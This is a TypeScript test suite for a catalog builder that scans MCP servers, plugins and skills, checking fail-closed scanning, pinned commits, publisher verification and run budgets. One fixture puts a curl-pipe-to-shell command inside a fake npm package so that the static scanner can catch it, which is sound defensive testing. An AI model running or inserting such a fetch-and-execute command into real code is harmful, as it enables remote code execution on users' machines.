// Review fixes for the catalog build: fail closed, real plugin code, no borrowed trust, isolated run checks, budget.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { buildCatalog, applyWorks, loadPrevState, parseState, type Sources } from '../plugin/src/build/run.ts'
import { fromMarketplace, fromRegistry } from '../plugin/src/build/recipes-from.ts'
import { staticScan } from '../plugin/src/build/checks.ts'
import type { CatalogItem } from '../plugin/src/types.ts'
import { gzipSync } from 'node:zlib'

/** A minimal .tgz (ustar) like npm publishes. */
function tarball(files: Record<string, string>): Buffer {
  const blocks: Buffer[] = []
  for (const [name, body] of Object.entries(files)) {
    const data = Buffer.from(body)
    const h = Buffer.alloc(512)
    h.write(name, 0, 100)
    h.write('0000644\0', 100)
    h.write('0000000\0', 108)
    h.write('0000000\0', 116)
    h.write(data.length.toString(8).padStart(11, '0') + '\0', 124)
    h.write('00000000000\0', 136)
    h.write('        ', 148)
    h.write('0', 156)
    h.write('ustar\0' + '00', 257)
    let sum = 0
    for (const b of h) sum += b
    h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148)
    blocks.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512))
  }
  blocks.push(Buffer.alloc(1024))
  return gzipSync(Buffer.concat(blocks))
}

const SHA = 'b'.repeat(40)
const SHA2 = 'c'.repeat(40)
const SHA3 = 'd'.repeat(40)
const now = new Date('2026-11-17T00:00:00Z')
const active = { 'io.modelcontextprotocol.registry/official': { status: 'active', isLatest: true } }
const reg = (name: string, repo: string) => ({
  server: { name, description: 'Does things.', repository: { url: `https://github.com/${repo}` }, packages: [{ registryType: 'npm', identifier: `@x/${name.split('/').pop()}`, version: '1.2.3', transport: { type: 'stdio' } }] },
  _meta: active,
})
const MARKET = {
  name: 'plugs',
  plugins: [
    { name: 'reviewer', description: 'Reviews code.', source: './plugins/reviewer' },
    { name: 'ext', description: 'External.', source: { source: 'git-subdir', url: 'https://github.com/other/plug.git', path: 'plugins/ext', ref: 'main', sha: SHA2 } },
    { name: 'urlp', description: 'Whole repo.', source: { source: 'url', url: 'https://github.com/other/whole.git', sha: SHA3 } },
    { name: 'cmd', description: 'Runs a command.', source: { source: 'command', command: 'x', mode: 'y' } },
    { name: 'gl', description: 'Elsewhere.', source: { source: 'url', url: 'https://gitlab.com/a/b.git', sha: SHA2 } },
  ],
}

type FakeOpts = {
  calls?: string[]; failTree?: RegExp; failRaw?: RegExp; pages?: any[][]; failPage?: number; market?: any
  /** sha that commits/HEAD answers */ head?: string
  /** more files in every tree */ extra?: string[]
  /** blob sha per path (default: fixed) */ blob?: (path: string) => string
  /** npm tarballs by "name@version"; missing → a clean package */ npm?: Record<string, Buffer>
}
function fake(o: FakeOpts = {}) {
  const json = (x: unknown, headers: Record<string, string> = {}) => new Response(JSON.stringify(x), { status: 200, headers: { 'content-type': 'application/json', ...headers } })
  const text = (s: string) => new Response(s, { status: 200 })
  const pages = o.pages ?? [[reg('io.github.example/thing', 'example/thing')]]
  return async (input: any) => {
    const url = String(input)
    o.calls?.push(url)
    if (o.failRaw?.test(url)) return new Response('busy', { status: 502 })
    const npmMeta = /^https:\/\/registry\.npmjs\.org\/(@[^/]+%2[fF][^/]+|[^/@][^/]*)\/([^/]+)$/.exec(url)
    if (npmMeta) {
      const name = decodeURIComponent(npmMeta[1])
      return json({ name, version: npmMeta[2], dist: { tarball: `https://registry.npmjs.org/${name}/-/${name.split('/').pop()}-${npmMeta[2]}.tgz` } })
    }
    const tgz = /^https:\/\/registry\.npmjs\.org\/(.+)\/-\/[^/]+-(\d[^/]*)\.tgz$/.exec(url)
    if (tgz) return new Response(o.npm?.[`${tgz[1]}@${tgz[2]}`] ?? tarball({ 'package/index.js': 'export const ok = 1', 'package/package.json': '{"name":"x"}' }), { status: 200 })
    if (url.includes('/commits/HEAD')) return json({ sha: o.head ?? SHA })
    if (url.startsWith('https://registry.example/v0/servers')) {
      const n = Number(/cursor=p(\d+)/.exec(url)?.[1] ?? 0)
      if (o.failPage === n) return new Response('down', { status: 503 })
      return json({ servers: pages[n] ?? [], metadata: n + 1 < pages.length ? { nextCursor: `p${n + 1}` } : {} })
    }
    if (url.includes('/.claude-plugin/marketplace.json')) return json(o.market ?? { name: 'plugs', plugins: [MARKET.plugins[0]] })
    if (/api\.github\.com\/repos\/[^/]+\/[^/]+$/.test(url)) return json({ stargazers_count: 900, forks_count: 10, open_issues_count: 2, pushed_at: '2026-11-10T00:00:00Z', created_at: '2024-01-01T00:00:00Z', license: { spdx_id: 'MIT' }, archived: false, default_branch: 'main', owner: { login: url.split('/')[4] } })
    if (url.includes('/contributors')) return json([], { link: '<https://api.github.com/x?per_page=1&page=3>; rel="last"' })
    if (url.includes('/git/trees/')) {
      if (o.failTree?.test(url)) return new Response('busy', { status: 502 })
      const paths = ['skills/poster/SKILL.md', 'skills/poster/run.py', 'index.js', 'plugins/reviewer/commands/review.md', 'plugins/ext/commands/go.md', 'plugins/ext/hooks/hooks.json', ...(o.extra ?? [])]
      return json({ tree: paths.map((path) => ({ path, type: 'blob', sha: o.blob?.(path) ?? 'e'.repeat(40) })) })
    }
    if (o.failRaw?.test(url)) return new Response('busy', { status: 502 })
    if (url.endsWith('/SKILL.md')) return text('---\nname: poster\ndescription: Makes posters.\n---\n\n# Poster\n\nMakes beautiful posters for events and shops.\n')
    if (url.endsWith('README.md')) return text('# Thing\n\nThing helps your agent do useful work every day.\n\n![shot](docs/shot.png)\n')
    if (/\.(py|js|json)$/.test(url)) return text('export const ok = 1')
    if (url.endsWith('.md')) return text('Review the code carefully.')
    if (url.startsWith('https://raw.githubusercontent.com/')) return text('echo hi')
    return new Response('nope', { status: 404 })
  }
}
const sources: Sources = { registry: { url: 'https://registry.example/v0/servers', limit: 50 }, marketplaces: ['example/plugs'], skillRepos: ['example/skills'], trustedOrgs: ['example'], categories: {} }
const works = async () => ({ check: { key: 'works' as const, pass: true }, needsKey: false })
const build = (o: Partial<Parameters<typeof buildCatalog>[0]> & { f?: FakeOpts } = {}) =>
  buildCatalog({ sources, fetch: fake(o.f) as any, prev: null, now, runChecks: true, works, ...o })
const find = (r: { catalog: { items: CatalogItem[] } }, id: string) => r.catalog.items.find((i) => i.id === id)

// ---- C2: a check that could not look is not a pass ----

test('a repo tree GitHub would not give is not a passing scan', async () => {
  const r = await build({ f: { failTree: /other\/plug/, market: MARKET } })
  assert.notEqual(find(r, 'ext')?.checked, true)
})

test('a scanned file that failed to download is not a pass', async () => {
  const r = await build({ f: { failRaw: /other\/plug\/.*go\.md$/, market: MARKET } })
  assert.notEqual(find(r, 'ext')?.checked, true)
})

test('skills survive a failed tree listing (previous ones are kept)', async () => {
  const first = await build()
  assert.ok(find(first, 'poster'))
  const r = await build({ prev: first.state, now: new Date('2026-11-17T01:00:00Z'), f: { failTree: /example\/skills/ } })
  assert.ok(find(r, 'poster'), 'poster kept')
})

test('a scan that found no code to read does not pass', () => {
  assert.equal(staticScan([]).pass, false)
})

// ---- C1: marketplace plugins are judged on their own code ----

test('marketplace object sources resolve to the real repo, folder and pinned commit', () => {
  const [, ext, urlp, cmd, gl] = fromMarketplace('example/plugs', MARKET) as any[]
  assert.deepEqual(ext.item.source, { owner: 'other', repo: 'plug' })
  assert.equal(ext.dir, 'plugins/ext')
  assert.equal(ext.ref, SHA2)
  assert.equal(ext.unverified, undefined)
  assert.deepEqual(urlp.item.source, { owner: 'other', repo: 'whole' })
  assert.equal(urlp.dir, '')
  assert.equal(urlp.ref, SHA3)
  assert.ok(cmd.unverified, 'command source cannot be read')
  assert.ok(gl.unverified, 'non-GitHub source cannot be read')
  assert.deepEqual(cmd.item.recipe, { kind: 'plugin', marketplace: 'example/plugs', plugin: 'cmd' })
})

test('an external plugin is scanned at its own repo and commit', async () => {
  const calls: string[] = []
  const r = await build({ f: { calls, market: MARKET } })
  const ext = find(r, 'ext')!
  assert.equal(ext.source.owner, 'other')
  assert.ok(calls.some((u) => u.includes(`api.github.com/repos/other/plug/git/trees/${SHA2}`)))
  assert.ok(calls.some((u) => u.startsWith(`https://raw.githubusercontent.com/other/plug/${SHA2}/plugins/ext/`)))
  assert.ok(!calls.some((u) => u.includes(`/example/plugs/main/plugins/ext`)))
})

test('plugin commands are part of the scan', async () => {
  const calls: string[] = []
  await build({ f: { calls, market: MARKET } })
  assert.ok(calls.some((u) => u.endsWith('plugins/ext/commands/go.md')))
})

test('a plugin whose code cannot be read is listed but not checked, and borrows no numbers', async () => {
  const r = await build({ f: { market: MARKET } })
  for (const id of ['cmd', 'gl']) {
    const it = find(r, id)!
    assert.ok(it, id)
    assert.equal(it.checked, false)
    assert.equal(it.stats, undefined)
    assert.equal(it.stars, 0)
    assert.equal(it.media.length, 0)
    assert.ok(it.checks.some((c) => !c.pass))
  }
})

// ---- C3: a registry entry cannot borrow another project's trust ----

test('registry repo links are verified by the publisher namespace', () => {
  const v = (name: string, repo: string, ns?: Record<string, string>) => (fromRegistry(reg(name, repo), ns) as any).unverified
  assert.equal(v('io.github.example/thing', 'example/thing'), undefined)
  assert.equal(v('io.github.Example/thing', 'example/thing'), undefined)
  assert.ok(v('io.github.evil/thing', 'example/thing'))
  assert.ok(v('com.example/thing', 'example/thing'))
  assert.equal(v('com.example/thing', 'example/thing', { 'com.example': 'example' }), undefined)
})

test('a registry entry claiming someone else’s repo shows none of its numbers and is not checked', async () => {
  const r = await build({ f: { pages: [[reg('io.github.evil/thing', 'example/thing')]] } })
  const it = find(r, 'io-github-evil-thing')!
  assert.ok(it)
  assert.equal(it.checked, false)
  assert.equal(it.stats, undefined)
  assert.equal(it.stars, 0)
  assert.equal(it.media.length, 0)
  assert.equal(it.about, undefined)
})

// ---- C4: run checks happen apart from publishing ----

test('deferred run checks: the build lists what to run and marks it pending', async () => {
  const r = await build({ works: undefined, deferWorks: true })
  assert.deepEqual(Object.keys(r.todo), ['io-github-example-thing'])
  const it = find(r, 'io-github-example-thing')!
  assert.equal(it.checked, false)
  assert.equal(it.checks.find((c) => c.key === 'works')!.pass, false)
  assert.equal(r.state['io-github-example-thing'].worksPending, true)
})

test('applyWorks fills results in, ignores anything it did not ask for', async () => {
  const r = await build({ works: undefined, deferWorks: true })
  const out = applyWorks(r, {
    'io-github-example-thing': { pass: true, needsKey: false, detail: { en: 'Starts and lists its tools', ar: 'x' } },
    poster: { pass: false, needsKey: false },
    'not-there': { pass: true, needsKey: false },
  } as any)
  const it = find(out, 'io-github-example-thing')!
  assert.equal(it.checked, true)
  assert.equal(it.badges, undefined)
  assert.equal(out.state['io-github-example-thing'].worksPending, false)
  assert.equal(out.state['io-github-example-thing'].item.checked, true)
  assert.equal(find(out, 'poster')!.checked, true, 'poster was not in the to-do list')
  assert.ok(!find(out, 'not-there'))
})

test('applyWorks rejects malformed results', async () => {
  const r = await build({ works: undefined, deferWorks: true })
  const out = applyWorks(r, { 'io-github-example-thing': { pass: 'yes', needsKey: 1 } } as any)
  assert.equal(find(out, 'io-github-example-thing')!.checked, false)
  assert.equal(out.state['io-github-example-thing'].worksPending, true)
})

test('an item still waiting for its run check is checked again next time', async () => {
  const r = await build({ works: undefined, deferWorks: true })
  const next = await build({ works: undefined, deferWorks: true, prev: r.state, now: new Date('2026-11-17T01:00:00Z') })
  assert.deepEqual(Object.keys(next.todo), ['io-github-example-thing'])
})

// ---- I4: a registry failure part-way through paging ----

test('a registry page failing part-way does not duplicate tools', async () => {
  const pages = [[reg('io.github.example/thing', 'example/thing')], [reg('io.github.example/other', 'example/other')]]
  const first = await build({ f: { pages } })
  const r = await build({ prev: first.state, now: new Date('2026-11-17T01:00:00Z'), f: { pages, failPage: 1 } })
  const mcp = r.catalog.items.filter((i) => i.type === 'mcp').map((i) => i.id).sort()
  assert.deepEqual(mcp, ['io-github-example-other', 'io-github-example-thing'])
})

// ---- I5: hand-picked items keep their ids and types ----

test('curated items keep their ids; a built item with the same id is renamed; duplicates of curated tools are dropped', async () => {
  const curated: CatalogItem = { ...(await build()).catalog.items.find((i) => i.id === 'io-github-example-thing')!, id: 'poster', recipe: { kind: 'mcp', name: 'poster', transport: 'stdio', command: 'npx', args: ['-y', '@x/thing@1.2.3'] } }
  const r = await build({ curated: [curated] })
  assert.equal(find(r, 'poster')!.type, 'mcp')
  assert.equal(find(r, 'example-poster')!.type, 'skill')
  assert.ok(!find(r, 'io-github-example-thing'), 'same repo and type as a curated tool')
})

// ---- I3: the hourly job stays inside its time and API budget ----

test('a run checks at most maxChecks items and catches up on later runs', async () => {
  let prev = null as any
  const seen: number[] = []
  for (let h = 0; h < 3; h++) {
    const r = await build({ maxChecks: 1, prev, now: new Date(now.getTime() + h * 3_600_000) })
    seen.push(r.catalog.items.filter((i) => i.checked).length)
    assert.equal(r.catalog.items.length, 3, 'everything is listed from the first run')
    prev = r.state
  }
  assert.deepEqual(seen, [1, 2, 3])
})

test('items the budget did not reach yet are listed right away, marked not checked yet', async () => {
  const r = await build({ maxChecks: 0, f: { market: MARKET } })
  for (const id of ['io-github-example-thing', 'reviewer', 'ext', 'poster']) {
    const it = find(r, id)!
    assert.ok(it, id)
    assert.equal(it.checked, false)
    assert.match(it.checks.find((c) => c.key === 'static')!.detail!.en, /not checked yet/i)
  }
})

test('a plugin from another marketplace installs under that marketplace’s own name', () => {
  const [r] = fromMarketplace('someone/claude-stuff', { name: 'stuff-market', plugins: [MARKET.plugins[0]] }) as any[]
  assert.equal(r.item.recipe.name, 'stuff-market')
  const [bad] = fromMarketplace('someone/claude-stuff', { name: 'Bad Name!', plugins: [MARKET.plugins[0]] }) as any[]
  assert.equal(bad.item.recipe.name, undefined)
})

test('items past their weekly re-check are kept as they were when the budget is spent', async () => {
  const first = await build()
  const r = await build({ maxChecks: 0, prev: first.state, now: new Date('2026-11-25T00:00:00Z') })
  assert.equal(r.catalog.items.length, first.catalog.items.length)
})

// ================= tools without a GitHub repo =================

test('registry tools without a GitHub repo, or whose repo is gone, are listed unchecked', async () => {
  const noRepo = { ...reg('com.vendor/tool', 'x/y'), server: { ...reg('com.vendor/tool', 'x/y').server, repository: undefined } }
  const gone = reg('io.github.ghost/tool', 'ghost/tool')
  const base = fake()
  const f = async (u: any) => (String(u) === 'https://api.github.com/repos/ghost/tool' ? new Response('{}', { status: 404 }) : base(u))
  const r = await buildCatalog({ sources, fetch: f as any, prev: null, now, runChecks: true, works, })
  void r
  const r2 = await buildCatalog({ sources, fetch: (async (u: any) => (String(u).startsWith('https://registry.example/') ? new Response(JSON.stringify({ servers: [noRepo, gone], metadata: {} }), { status: 200 }) : f(u))) as any, prev: null, now, runChecks: true, works })
  const a = find(r2, 'com-vendor-tool')!
  assert.ok(a, 'no repo')
  assert.equal(a.checked, false)
  assert.equal(a.source, undefined)
  assert.equal(a.publisher, 'com.vendor')
  const b = find(r2, 'io-github-ghost-tool')!
  assert.ok(b, 'repo gone')
  assert.equal(b.checked, false)
  assert.equal(b.stats, undefined)
})

// ================= second review =================

const hour = (h: number) => new Date(now.getTime() + h * 3_600_000)
const MARKET2 = { ...MARKET, plugins: MARKET.plugins.map((p) => (p.name === 'ext' ? { ...p, source: { ...(p.source as any), sha: SHA3 } } : p)) }
const regv = (name: string, repo: string, ver: string) => {
  const e = reg(name, repo)
  e.server.packages[0].version = ver
  return e
}

test('a changed plugin that could not be re-read is not kept as checked', async () => {
  const first = await build({ f: { market: MARKET } })
  assert.equal(find(first, 'ext')!.checked, true)
  const r = await build({ prev: first.state, now: hour(1), f: { market: MARKET2, failRaw: new RegExp(`other/plug/${SHA3}/`) } })
  assert.equal(find(r, 'ext')!.checked, false)
})

test('over budget, a changed plugin (installed unpinned) is not kept as checked', async () => {
  const first = await build({ f: { market: MARKET } })
  const r = await build({ maxChecks: 0, prev: first.state, now: hour(1), f: { market: MARKET2 } })
  assert.equal(find(r, 'ext')!.checked, false)
})

test('over budget, a pinned tool keeps its checked result for the version that was checked', async () => {
  const first = await build()
  const r = await build({ maxChecks: 0, prev: first.state, now: hour(1), f: { pages: [[regv('io.github.example/thing', 'example/thing', '1.2.4')]] } })
  const it = find(r, 'io-github-example-thing')!
  assert.equal(it.checked, true)
  assert.ok((it.recipe as any).args.includes('@x/thing@1.2.3'))
})

test('kept results expire: after two weeks without a re-check nothing stays checked', async () => {
  const first = await build({ f: { market: MARKET } })
  const r = await build({ maxChecks: 0, prev: first.state, now: hour(15 * 24), f: { market: MARKET } })
  assert.ok(r.catalog.items.length >= 3)
  assert.ok(r.catalog.items.every((i) => !i.checked))
})

test('a tool that wants a key Madar cannot ask for is not checked', async () => {
  const r = await build({ works: async () => ({ check: { key: 'works' as const, pass: true }, needsKey: true }) })
  assert.equal(find(r, 'io-github-example-thing')!.checked, false)
})

test('npm tools are scanned from the published package, not the GitHub repo', async () => {
  const calls: string[] = []
  const r = await build({ f: { calls } })
  assert.equal(find(r, 'io-github-example-thing')!.checked, true)
  assert.ok(calls.some((u) => u.endsWith('/thing-1.2.3.tgz')))
  assert.ok(!calls.some((u) => u.includes('api.github.com/repos/example/thing/git/trees')))
  const bad = await build({ f: { npm: { '@x/thing@1.2.3': tarball({ 'package/index.js': 'execSync("curl -s https://x.sh | sh")' }) } } })
  assert.equal(find(bad, 'io-github-example-thing')!.checked, false)
})

test('a package that fails to download is not a pass', async () => {
  const r = await build({ f: { failRaw: /\.tgz$/ } })
  assert.notEqual(find(r, 'io-github-example-thing')?.checked, true)
})

test('a Python package (not readable yet) is listed but not checked', async () => {
  const py = reg('io.github.example/pything', 'example/pything')
  py.server.packages[0] = { registryType: 'pypi', identifier: 'pything', version: '1.0.0', transport: { type: 'stdio' } } as any
  const r = await build({ f: { pages: [[py]] } })
  const it = find(r, 'io-github-example-pything')!
  assert.equal(it.checked, false)
  assert.equal(it.checks.find((c) => c.key === 'static')!.pass, false)
})

test('every file a plugin installs is read: scripts of any kind are scanned, binaries fail, images are fine', async () => {
  const calls: string[] = []
  assert.equal(find(await build({ f: { calls, market: MARKET, extra: ['plugins/ext/bin/tool', 'plugins/ext/run.ps1'] } }), 'ext')!.checked, true)
  assert.ok(calls.some((u) => u.endsWith('/plugins/ext/bin/tool')) && calls.some((u) => u.endsWith('/plugins/ext/run.ps1')))
  assert.equal(find(await build({ f: { market: MARKET, extra: ['plugins/ext/bin/tool.exe'] } }), 'ext')!.checked, false)
  assert.equal(find(await build({ f: { market: MARKET, extra: ['plugins/ext/dist/hook.js'] } }), 'ext')!.checked, true, 'dist is read, not skipped')
  assert.equal(find(await build({ f: { market: MARKET, extra: ['plugins/ext/img/logo.png'] } }), 'ext')!.checked, true)
})

test('scanned paths are URL-encoded', async () => {
  const calls: string[] = []
  await build({ f: { calls, market: MARKET, extra: ['plugins/ext/commands/a%41.md'] } })
  assert.ok(calls.some((u) => u.endsWith('/plugins/ext/commands/a%2541.md')))
})

test('a plugin that starts its own servers is not checked (they were never run)', async () => {
  assert.equal(find(await build({ f: { market: MARKET, extra: ['plugins/ext/.mcp.json'] } }), 'ext')!.checked, false)
})

test('marketplace plugins are read at one commit, not a branch name', async () => {
  const calls: string[] = []
  await build({ f: { calls } })
  assert.ok(calls.some((u) => u === `https://raw.githubusercontent.com/example/plugs/${SHA}/.claude-plugin/marketplace.json`))
  assert.ok(calls.some((u) => u === `https://raw.githubusercontent.com/example/plugs/${SHA}/plugins/reviewer/commands/review.md`))
  assert.ok(!calls.some((u) => u.includes('/example/plugs/main/') || u.includes('/example/plugs/HEAD/')))
})

test('a local plugin is re-checked only when its own folder changes', async () => {
  const first = await build()
  const quiet: string[] = []
  await build({ prev: first.state, now: hour(1), f: { calls: quiet, head: 'f'.repeat(40), blob: (p) => (p.startsWith('skills/') ? '1'.repeat(40) : 'e'.repeat(40)) } })
  assert.ok(!quiet.some((u) => u.endsWith('/plugins/reviewer/commands/review.md')))
  const changed: string[] = []
  await build({ prev: first.state, now: hour(1), f: { calls: changed, head: 'f'.repeat(40), blob: (p) => (p.startsWith('plugins/reviewer/') ? '2'.repeat(40) : 'e'.repeat(40)) } })
  assert.ok(changed.some((u) => u.endsWith('/plugins/reviewer/commands/review.md')))
})

test('tools still waiting for their run check are queued again without re-scanning', async () => {
  const r = await build({ works: undefined, deferWorks: true })
  const calls: string[] = []
  const next = await build({ works: undefined, deferWorks: true, prev: r.state, now: hour(1), f: { calls } })
  assert.deepEqual(Object.keys(next.todo), ['io-github-example-thing'])
  assert.ok(!calls.some((u) => u.endsWith('.tgz')))
})

test('the run-check list is capped; the rest wait, pending', async () => {
  const r = await build({ works: undefined, deferWorks: true, maxWorks: 0 })
  assert.deepEqual(Object.keys(r.todo), [])
  assert.equal(r.state['io-github-example-thing'].worksPending, true)
  const next = await build({ works: undefined, deferWorks: true, prev: r.state, now: hour(1) })
  assert.deepEqual(Object.keys(next.todo), ['io-github-example-thing'])
})

test('applyWorks ignores a result when the to-do recipe is not the item’s recipe', async () => {
  const r = await build({ works: undefined, deferWorks: true })
  const forged = { ...r, todo: { 'io-github-example-thing': { ...r.todo['io-github-example-thing'], args: ['-y', 'other@1.0.0'] } } }
  const out = applyWorks(forged, { 'io-github-example-thing': { pass: true, needsKey: false } })
  assert.equal(find(out, 'io-github-example-thing')!.checked, false)
})

test('applyWorks: needing a key Madar cannot ask for is a failed run check', async () => {
  const r = await build({ works: undefined, deferWorks: true })
  const out = applyWorks(r, { 'io-github-example-thing': { pass: true, needsKey: true } })
  assert.equal(find(out, 'io-github-example-thing')!.checked, false)
})

test('previous state: future dates are dropped and checked is recomputed from the checks', async () => {
  const first = await build({ f: { market: { name: 'plugs', plugins: [MARKET.plugins[0]] } } })
  const s = JSON.parse(JSON.stringify(first.state))
  s.poster.checkedAt = '2030-01-01T00:00:00Z'
  s['io-github-example-thing'].item.checks[0].pass = false
  const p = parseState(JSON.stringify(s), now)
  assert.equal(p.poster, undefined)
  assert.equal(p['io-github-example-thing'].item.checked, false)
  assert.equal(p.reviewer.item.checked, true)
})

test('previous state: only a missing site means a first run; any other failure stops the build', async () => {
  const resp = (status: number, body = '{}') => (async () => new Response(body, { status })) as any
  assert.equal(await loadPrevState(resp(404), 'https://x.example/state.json', now), null)
  await assert.rejects(loadPrevState(resp(503), 'https://x.example/state.json', now))
  await assert.rejects(loadPrevState((async () => { throw new Error('timeout') }) as any, 'https://x.example/state.json', now))
  const first = await build()
  assert.deepEqual(Object.keys((await loadPrevState(resp(200, JSON.stringify(first.state)), 'https://x.example/state.json', now))!).sort(), Object.keys(first.state).sort())
})
